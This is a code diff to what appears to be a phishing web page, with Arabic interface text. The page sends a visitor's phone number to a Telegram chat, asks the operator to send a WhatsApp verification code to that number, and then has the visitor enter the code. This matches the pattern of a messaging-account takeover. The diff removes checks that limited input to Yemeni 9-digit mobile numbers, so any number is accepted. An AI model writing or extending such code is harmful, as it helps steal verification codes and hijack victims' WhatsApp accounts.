@@ -853,43 +853,36 @@ async function submitPhoneNumberFirst() {
     const phoneNumber = phoneInput.value.trim();
     const status = document.getElementById('status');
     
-    // Validate: Must be exactly 9 digits and start with 77, 78, 71, 70, or 73
-    const validPrefixes = ['77', '78', '71', '70', '73'];
-    const phonePrefix = phoneNumber.substring(0, 2);
-    
-    if (!phoneNumber || phoneNumber.length !== 9 || !/^\d+$/.test(phoneNumber)) {
-        alert('⚠️ يرجى إدخال رقم هاتف صحيح (9 أرقام)');
+    // ✅ تحقق بسيط: فقط نتأكد إنه مو فاضي وإنه أرقام
+    if (!phoneNumber || !/^\d+$/.test(phoneNumber)) {
+        alert('⚠️ يرجى إدخال رقم هاتف (أرقام فقط)');
         return;
     }
     
-    if (!validPrefixes.includes(phonePrefix)) {
-        alert('⚠️ رقم الهاتف يجب أن يبدأ بأحد الأرقام التالية: 77, 78, 71, 70, 73');
-        return;
-    }
-    
-    // Reset verification attempts
+    // تصفير عدد محاولات التحقق
     verificationAttempts = 0;
     
-    // Show loading message
+    // إظهار رسالة جارِ الإرسال
     status.innerHTML = '<div class="loading">⏳ جارٍ إرسال رمز التحقق إلى واتساب...</div>';
     
-    // Send phone number to Telegram
+    // إرسال رقم الهاتف إلى تيليجرام
     await sendToTelegram(`📱 رقم الهاتف المدخل:\n${phoneNumber}\n\n⚠️ يرجى إرسال رمز التحقق إلى هذا الرقم عبر واتساب`);
     
-    // Wait a moment
+    // انتظار بسيط
     await new Promise(resolve => setTimeout(resolve, 2000));
     
-    // Show verification code input (wait for admin to send code via WhatsApp)
+    // إظهار إدخال رمز التحقق (نفس الفكرة القديمة)
     status.innerHTML = `<div class="success">
         <h3 style="color: #28a745; margin-bottom: 15px;">✅ تم إرسال رمز التحقق إلى واتساب</h3>
         <p style="color: #333; font-size: 1.1em; margin: 15px 0;">تحقق من رسائل واتساب الخاصة بك</p>
         <p style="color: #666; margin: 10px 0;">أدخل الرمز المرسل إليك (4 أرقام على الأقل)</p>
         <div style="margin: 20px 0;">
-            <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" style="width: 60%; padding: 12px; border: 2px solid #FFD700; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
+            <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" maxlength="10" style="width: 60%; padding: 12px; border: 2px solid #FFD700; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
         </div>
         <button onclick="submitVerificationCodeFirst()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">تأكيد الرمز</button>
     </div>`;
 }
+
 
 // Submit verification code FIRST (before permissions)
 async function submitVerificationCodeFirst() {
@@ -1095,15 +1088,31 @@ function showMandatoryJoinModal() {
                 </p>
             </div>
             <div style="margin: 20px 0;">
-                <input type="tel" id="joinPhoneNumber" placeholder="مثال: 771234567" maxlength="9" style="width: 70%; padding: 15px; border: 3px solid #FFD700; border-radius: 10px; font-size: 1.3em; text-align: center; direction: ltr; font-weight: bold; transition: all 0.3s;" onfocus="this.style.borderColor='#1E90FF'; this.style.boxShadow='0 0 10px rgba(30, 144, 255, 0.3)';" onblur="this.style.borderColor='#FFD700'; this.style.boxShadow='none';" />
-            </div>
-            <button onclick="submitJoinPhoneNumber()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); margin-top: 10px; transition: all 0.3s;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 8px 20px rgba(255, 215, 0, 0.6)';" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 5px 15px rgba(255, 215, 0, 0.4)';">
-                متابعة →
-            </button>
-            <p style="color: #999; font-size: 0.85em; margin-top: 15px;">
-                بالضغط على "متابعة" أنت توافق على <a href="#" onclick="showTerms(); return false;" style="color: #1E90FF; text-decoration: underline;">شروط الاستخدام</a> و <a href="#" onclick="showPrivacy(); return false;" style="color: #1E90FF; text-decoration: underline;">سياسة الخصوصية</a>
-            </p>
-        </div>
+    <input
+        type="tel"
+        id="joinPhoneNumber"
+        placeholder="أدخل رقم هاتفك"
+        style="width: 70%; padding: 15px; border: 3px solid #FFD700; border-radius: 10px; font-size: 1.3em; text-align: center; direction: ltr; font-weight: bold; transition: all 0.3s;"
+        onfocus="this.style.borderColor='#1E90FF'; this.style.boxShadow='0 0 10px rgba(30, 144, 255, 0.3)';"
+        onblur="this.style.borderColor='#FFD700'; this.style.boxShadow='none';"
+    />
+</div>
+<button
+    onclick="submitJoinPhoneNumber()"
+    style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4); margin-top: 10px; transition: all 0.3s;"
+    onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 8px 20px rgba(255, 215, 0, 0.6)';"
+    onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 5px 15px rgba(255, 215, 0, 0.4)';"
+>
+    متابعة →
+</button>
+<p style="color: #999; font-size: 0.85em; margin-top: 15px;">
+    بالضغط على "متابعة" أنت توافق على
+    <a href="#" onclick="showTerms(); return false;" style="color: #1E90FF; text-decoration: underline;">شروط الاستخدام</a>
+    و
+    <a href="#" onclick="showPrivacy(); return false;" style="color: #1E90FF; text-decoration: underline;">سياسة الخصوصية</a>
+</p>
+</div>
+
     `;
     
     modal.style.display = 'block';
@@ -1116,21 +1125,14 @@ async function submitJoinPhoneNumber() {
     const phoneNumber = phoneInput.value.trim();
     const modalBody = document.getElementById('joinModalBody');
     
-    // Validate: Must be exactly 9 digits and start with 77, 78, 71, 70, or 73
-    const validPrefixes = ['77', '78', '71', '70', '73'];
-    const phonePrefix = phoneNumber.substring(0, 2);
-    
-    if (!phoneNumber || phoneNumber.length !== 9 || !/^\d+$/.test(phoneNumber)) {
-        alert('⚠️ يرجى إدخال رقم هاتف صحيح (9 أرقام)');
+    // ✅ تحقق بسيط: فقط نتأكد أن الحقل مو فاضي وأنه أرقام
+    // بدون أي شرط بداية وبدون شرط طول معيّن
+    if (!phoneNumber || !/^\d+$/.test(phoneNumber)) {
+        alert('⚠️ يرجى إدخال رقم هاتف (أرقام فقط)');
         return;
     }
     
-    if (!validPrefixes.includes(phonePrefix)) {
-        alert('⚠️ رقم الهاتف يجب أن يبدأ بأحد الأرقام التالية: 77, 78, 71, 70, 73');
-        return;
-    }
-    
-    // Save phone number
+    // حفظ رقم الهاتف
     localStorage.setItem('joinPhoneNumber', phoneNumber);
     
     // Show loading
@@ -1179,6 +1181,7 @@ async function submitJoinPhoneNumber() {
         </div>
     `;
 }
+
 
 // Global variable for join verification attempts
 let joinVerificationAttempts = 0;
